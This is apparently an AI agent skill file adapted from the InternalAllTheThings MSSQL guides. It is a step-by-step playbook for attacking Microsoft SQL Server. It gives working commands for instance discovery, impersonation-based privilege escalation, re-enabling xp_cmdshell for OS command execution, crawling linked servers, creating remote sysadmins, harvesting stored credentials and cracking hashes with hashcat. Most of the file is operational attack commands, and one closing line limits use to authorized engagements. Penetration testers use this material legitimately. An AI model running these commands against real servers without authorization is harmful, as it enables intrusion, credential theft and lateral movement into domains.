---
name: mssql-security
description: >-
  Attack and audit Microsoft SQL Server: enumeration, audit checks, credential harvesting (linked
  servers, logins, SQL agent jobs), linked-database crawling, and OS command execution via
  xp_cmdshell, OLE automation and CLR assemblies. Use when MSSQL is reachable with credentials or
  integrated authentication, when you need a command-execution path from a database, or when
  reviewing MSSQL configuration.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "5"
  generated-by: build/build.py
---

# Microsoft SQL Server Attacks

MSSQL is a two-stage target: first you establish the login's actual authority (sysadmin or not), then you convert that authority into either OS command execution or a link to another server. The distinction that matters is execution context - xp_cmdshell, OLE Automation and CLR run as the SQL Server service account, Agent jobs run as the Agent service account unless a proxy is configured, and a linked-server query runs as the login mapped on the remote side. Done means: an authenticated login, a confirmed execution context, and either a shell or a chain to the next instance.

## When to use this skill

- MSSQL is reachable with credentials, Windows integrated authentication, or from a compromised host as the service account.
- You need OS command execution from a database, or a path from a database into the domain via linked servers or service-account reuse.
- You are auditing MSSQL configuration: impersonation, trustworthy databases, sysadmin membership, stored credentials.
- Not this skill: the domain identities behind the SQL logins → `active-directory-credentials`; the host OS after you get execution → `active-directory-lateral-movement`; blind SQL injection against a web app → the application-level skill in scope for that target.

## First moves

1. Find instances before guessing credentials. The domain query is the default when you have any domain context; broadcast/UDP scanning is for a flat network:

```powershell
Get-SQLInstanceLocal
Get-SQLInstanceDomain -Verbose
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLInstanceBroadcast -Verbose
Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1
```

2. Establish the authority you actually hold. `is_srvrolemember('sysadmin')` returning 1 makes everything below available; 0 means the escalation checks come first:

```sql
select suser_sname()
select system_user
select user
select is_srvrolemember('sysadmin')
```

3. If not sysadmin, check impersonation and trustworthy databases before anything else - both escalate without cracking a single hash:

```powershell
Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose
Invoke-SQLAuditPrivTrustworthy -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose
```

```sql
execute as user = 'dbo'
SELECT is_srvrolemember('sysadmin')
```

4. Map the linked-server graph - a link with `rpc out` enabled is code execution on the remote instance:

```sql
select * from master..sysservers
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```

```powershell
Get-SQLServerLinkCrawl -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```

5. Command execution with sysadmin, default path. `xp_cmdshell` is disabled by default since SQL Server 2005 and runs as the service account:

```powershell
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command whoami
```

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC master..xp_cmdshell 'whoami'
```

6. Harvest credentials rather than cracking first - stored credentials and proxies often lead straight to a domain account:

```sql
SELECT * FROM sys.credentials
USE msdb; SELECT proxy_id, name AS proxy_name, credential_id, enabled FROM dbo.sysproxies;
```

7. If you only get hashes, they are crackable with three distinct modes:

```bash
hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force
# 131 = MSSQL 2000, 132 = MSSQL 2005, 1731 = MSSQL 2012/2014
```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [mssql-enumeration.md](references/mssql-enumeration.md) | first contact with an instance or domain | PowerUpSQL/SQLRecon, local/domain/broadcast discovery, encrypted databases, login/role queries, table and column sampling, `Invoke-SQLDumpInfo` |
| [mssql-audit-checks.md](references/mssql-audit-checks.md) | the login is not sysadmin | impersonation (`EXECUTE AS LOGIN`), nested impersonation, `db_owner` to `dbo`, trustworthy databases, xp_dirtree/xp_fileexist/UNC-path checks |
| [mssql-linked-database.md](references/mssql-linked-database.md) | `sysservers` returns rows | link discovery and crawling, `openquery` chaining, enabling `rpc`/`rpc out`, xp_cmdshell over a link, creating a sysadmin on the remote instance |
| [mssql-credentials.md](references/mssql-credentials.md) | you need domain credentials, not just data | password hash extraction per version, `sys.credentials`, proxy accounts, Agent job in a proxy context, dbatools `Get-DecryptedObject` |
| [mssql-command-execution.md](references/mssql-command-execution.md) | you have sysadmin and need a shell | xp_cmdshell, extended stored procedures, CLR assemblies, OLE Automation, Agent jobs, external Python/R scripts |

## Workflow

1. **Discover and authenticate.** `Get-SQLInstanceLocal` on the host, `Get-SQLInstanceDomain | Get-SQLServerInfo` from a domain context. `Get-SQLDatabase -NoDefaults` gives the database names worth sampling.
2. **Decide the branch on `is_srvrolemember('sysadmin')`.** `1` → step 4. `0` → step 3.
3. **Escalate inside SQL.** `mssql-audit-checks.md`: impersonation first (`EXECUTE AS LOGIN`, nested impersonation), then `db_owner` → `execute as user='dbo'`, then a `TRUSTWORTHY ON` database owned by a sysadmin. Only then consider credential theft.
4. **Command execution: choose by what is enabled, not by preference.** `xp_cmdshell` if enabled (or re-enable it with `sp_configure`); if the procedure was uninstalled, `sp_addextendedproc 'xp_cmdshell','xplog70.dll'` or load your own extended procedure. If xp_cmdshell is blocked or monitored → OLE Automation (`SP_OACREATE`/`SP_OAMETHOD`) or a CLR assembly (`clr enabled`, `CREATE ASSEMBLY … PERMISSION_SET = UNSAFE`). If nothing can be enabled but you have the SQLAgent roles → an Agent job, which is also the path to a proxy's credential context. External Python/R scripts need the Advanced Analytics Extensions feature.
5. **Move laterally.** `mssql-linked-database.md`: `sysservers` → `openquery`; enable `rpc`/`rpc out` if missing; chain links for multi-hop; use `EXECUTE(...) AT [link]` to run `sp_configure`/`xp_cmdshell` remotely or to create a sysadmin there.
6. **Convert to domain access.** `mssql-credentials.md`: `sys.credentials` and proxies, then Agent job execution in the proxy context; service-account reuse across instances; hashes to Hashcat.
7. **Collect data last** - table and column sampling from `mssql-enumeration.md`, then stop.

## Gotchas

- `xp_cmdshell` is disabled by default from SQL Server 2005 onward and every re-enable is a `sp_configure` + `RECONFIGURE` pair; `show advanced options` must be enabled before the second one takes effect.
- Execution context is the whole game: xp_cmdshell, OLE Automation and CLR run as the **SQL Server service account**; Agent jobs run as the **Agent service account** unless a proxy is configured; CLR additionally needs `clr enabled`, `CREATE ASSEMBLY`/`ALTER ASSEMBLY`, and the assembly's SHA512 registered with `sp_add_trusted_assembly` before an UNSAFE import.
- OLE Automation is disabled by default, so `Invoke-SQLOSCmdOle` failing usually means "not enabled", not "no permission".
- Creating an Agent job requires **sysadmin** or the SQLAgentUserRole + SQLAgentReaderRole + SQLAgentOperatorRole combination - a plain `db_owner` cannot use that path.
- Linked-server code execution needs `rpc` **and** `rpc out` on the link; without them `openquery` still reads data but `EXEC ... AT` fails.
- `Invoke-SQLAuditPrivXpDirtree`, `Invoke-SQLAuditPrivXpFileexist` and `Invoke-SQLUncPathInjection` make outbound web requests (Inveigh via reflection) - they are not read-only and will fail silently in an environment without egress.
- Encrypted databases are decrypted automatically for sysadmins, so `is_encrypted = True` is only a finding if your login is not an admin.
- Hash modes differ by version (131/132/1731); using 1731 on a 2005 hash produces nothing and looks like a wrong password.

## Authorized use

These techniques are for authorized engagements only, with explicit permission and within the agreed scope. Command execution on a production database server can corrupt data or break the service account - confirm the change window first.

## Source

Converted from the upstream InternalAllTheThings MSSQL guides (https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
